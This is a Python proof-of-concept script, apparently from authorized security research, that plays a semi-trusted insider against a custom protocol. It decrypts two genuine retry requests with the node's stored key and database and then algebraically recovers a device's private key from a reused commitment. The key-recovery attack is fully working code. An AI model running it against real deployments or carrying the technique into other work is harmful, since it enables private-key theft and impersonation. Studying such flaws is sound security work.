#!/usr/bin/env python3
"""Offline Attack 3: NSP-insider recovery from two genuine SMD retry requests.

Reads only: a tar.gz supplied by SMD, NSP's already-archived validated Phase 2
state, NSP key/SQLite DB, node config, and archived Phase 3 request.

This code is an authorized local security experiment. It never imports or reads
SMD private key files, contacts Solana, writes protocol state, exports secret
scalars, or invokes the live Phase 3 verifier.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import sqlite3
import sys
import tarfile
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

# Same SEC1 point and length-prefixed SHA256 helpers as the NSP archival probe.
from inspect_archived_phase2_phase3 import N, b64, h_fields, pt, verify

NAMES = ("attempt_001/request.json", "attempt_002/request.json")


def require(condition: bool, label: str) -> None:
    if not condition:
        raise RuntimeError(label)
    print("[PASS]", label)


def read_bundle(path: Path) -> list[dict]:
    if not path.is_file() or path.stat().st_size > 128 * 1024:
        raise ValueError("Missing or oversized input bundle")
    with tarfile.open(path, "r:gz") as tf:
        members = tf.getmembers()
        if sorted(m.name for m in members) != sorted(NAMES):
            raise ValueError("Unexpected bundle content: exactly two requests required")
        if any(not m.isfile() or not 1 <= m.size <= 32 * 1024 for m in members):
            raise ValueError("Invalid request member")
        requests = []
        for name in NAMES:
            stream = tf.extractfile(name)
            if stream is None:
                raise ValueError("Unreadable member")
            obj = json.loads(stream.read().decode("utf-8"))
            if not isinstance(obj, dict) or not {"rid_smd", "e_smd"}.issubset(obj):
                raise ValueError("Invalid request fields")
            requests.append(obj)
        return requests


def public_matches_scalar(value: int, public_point: tuple[int, int]) -> bool:
    if not 1 <= value < N:
        return False
    key = ec.derive_private_key(value, ec.SECP256R1()).public_key()
    return pt(key) == public_point


def run(root: Path, bundle: Path) -> int:
    required = (
        "nsp/data/sk_nsp.pem", "nsp/data/phase2_verified_request.json",
        "nsp/data/nsp.db", "nsp/config/node.conf",
        "nsp/import/phase3_request.json",
    )
    missing = [p for p in required if not (root / p).is_file()]
    if missing:
        raise FileNotFoundError("Required NSP inputs missing")

    requests = read_bundle(bundle)
    require(len(requests) == 2, "Two real SMD retry requests loaded (read-only)")
    rid_text = requests[0]["rid_smd"]
    rid = b64(rid_text)
    require(len(rid) == 32 and requests[1]["rid_smd"] == rid_text,
            "Both requests have the same 32-byte RID")
    require(requests[0]["e_smd"] != requests[1]["e_smd"],
            "Encrypted request packages are distinct")

    archived = json.loads((root / "nsp/import/phase3_request.json").read_text())
    require(archived["rid_smd"] == rid_text,
            "SMD retry RID matches archived NSP session RID")

    state = json.loads((root / "nsp/data/phase2_verified_request.json").read_text())
    require(state.get("status") == "SMD_REQUEST_VERIFIED",
            "SMD was previously verified in archived registration")
    pk_raw = b64(state["pk_smd_sec1"])
    pk = pt(ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), pk_raw))
    a_pub = pt(ec.EllipticCurvePublicKey.from_encoded_point(
        ec.SECP256R1(), b64(state["A_smd_sec1"])))

    sk_nsp = serialization.load_pem_private_key(
        (root / "nsp/data/sk_nsp.pem").read_bytes(), password=None)
    require(isinstance(sk_nsp, ec.EllipticCurvePrivateKey)
            and sk_nsp.curve.name == "secp256r1",
            "NSP authorization key loaded locally for decryption")
    nsp_scalar = sk_nsp.private_numbers().private_value.to_bytes(32, "big")

    db_uri = f'file:{(root / "nsp/data/nsp.db").resolve().as_posix()}?mode=ro&immutable=1'
    with sqlite3.connect(db_uri, uri=True) as conn:
        row = conn.execute("SELECT s_nsp FROM smd_records WHERE rid_smd = ? LIMIT 1",
                           (rid_text,)).fetchone()
    require(row is not None, "RID found in read-only NSP database")
    s_nsp = bytes(row[0])
    if len(s_nsp) < 28:
        raise ValueError("Invalid stored credential package")
    store_key = HKDF(algorithm=hashes.SHA256(), length=32, salt=None,
                     info=b"TDSC-NSP-SENC-v1").derive(nsp_scalar)
    secret = json.loads(AESGCM(store_key).decrypt(
        s_nsp[:12], s_nsp[12:], b"TDSC-S-NSP-v1").decode("utf-8"))
    require(secret["eid_smd"] == state["eid_smd"],
            "NSP record and registered public keys belong to same SMD")

    cfg_lines = (root / "nsp/config/node.conf").read_text().splitlines()
    cfg = dict(line.strip().split("=", 1) for line in cfg_lines
               if line.strip() and not line.lstrip().startswith("#") and "=" in line)
    id_nsp = cfg["ID_NSP"]
    st = h_fields(secret["eid_smd"].encode("utf-8"), nsp_scalar)
    dt = h_fields(rid, b64(secret["r_nsp"]))

    verified = []
    for i, request in enumerate(requests, 1):
        package = b64(request["e_smd"])
        if len(package) < 28:
            raise ValueError("E_SMD package is too short")
        obj = json.loads(AESGCM(dt).decrypt(
            package[:12], package[12:], b"TDSC-E-SMD-v1").decode("utf-8"))
        r = b64(obj["r_smd"])
        token = b64(obj["v1_smd"])
        e = int.from_bytes(h_fields(rid, secret["eid_smd"].encode("utf-8"),
                                    id_nsp.encode("utf-8"), r, st), "big") % N
        require(len(r) == 32 and verify(token, e.to_bytes(32, "big"), pk, a_pub),
                f"Attempt {i}: NSP decrypted E_SMD and verified V1 equation")
        verified.append((r, int.from_bytes(token, "big"), e))

    (r1, v1, e1), (r2, v2, e2) = verified
    require(r1 != r2 and v1 != v2 and e1 != e2,
            "Fresh random values and distinct scalar challenges")

    recovered_sk = (v1 - v2) * pow((e1 - e2) % N, -1, N) % N
    recovered_a = (v1 - e1 * recovered_sk) % N
    require(public_matches_scalar(recovered_sk, pk)
            and public_matches_scalar(recovered_a, a_pub)
            and (e1 * recovered_sk + recovered_a) % N == v1
            and (e2 * recovered_sk + recovered_a) % N == v2,
            "ATTACK 3: recovered private scalar and fixed commitment match public points")

    print("\nRESULT: ATTACK 3 PASS — two genuine SMD Phase 3 retry requests")
    print("Threat model: semi-trusted NSP insider; offline decryption/verification")
    print("SMD private key file accessed: NO")
    print("Recovered scalars printed or saved: NO")
    print("Network, Solana, database, protocol state modified: NO")
    print("Current Solana revocation or live session acceptance proven: NO")
    print("Public-key SHA-256 fingerprint:", hashlib.sha256(pk_raw).hexdigest()[:20])
    return 0


def self_test() -> int:
    # Algebraic smoke test only. Not a protocol/live attack.
    sk = 1729
    a = 493
    e1, e2 = 123456789, 987654321
    v1 = (e1 * sk + a) % N
    v2 = (e2 * sk + a) % N
    candidate = (v1 - v2) * pow((e1 - e2) % N, -1, N) % N
    pub = pt(ec.derive_private_key(sk, ec.SECP256R1()).public_key())
    require(candidate == sk and public_matches_scalar(candidate, pub),
            "Synthetic algebra recovery and public-key verification")
    print("SELF-TEST PASSED (synthetic only)")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--root", type=Path, default=Path.cwd())
    parser.add_argument("--bundle", type=Path, help="Exact tar.gz produced by SMD")
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()
    if args.self_test:
        return self_test()
    if args.bundle is None:
        parser.error("--bundle is required outside --self-test")
    return run(args.root.resolve(), args.bundle.resolve())


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        # Do not print secrets or decrypted data on failures.
        print(f"[FAIL] Attack 3 halted ({type(exc).__name__}); no secrets printed", file=sys.stderr)
        raise SystemExit(2)
